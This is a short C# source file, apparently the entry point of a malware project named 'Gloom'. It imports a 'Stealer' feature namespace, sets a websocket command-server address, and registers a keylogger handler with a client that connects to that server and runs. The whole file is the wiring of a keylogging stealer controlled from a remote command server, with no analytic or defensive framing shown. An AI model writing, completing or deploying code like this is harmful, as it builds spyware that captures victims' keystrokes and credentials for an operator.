using Gloom.Features.Stealer;

namespace Gloom
{
	internal class Program
	{
		public const string CommandServer = "ws://127.0.0.1:8683";

		static void Main(string[] args)
		{
			var client = new MessageClient(new Uri(CommandServer));
			client.RegisterHandler(new KeyLogger(client));
			client.Run().Wait();
		}
	}
}
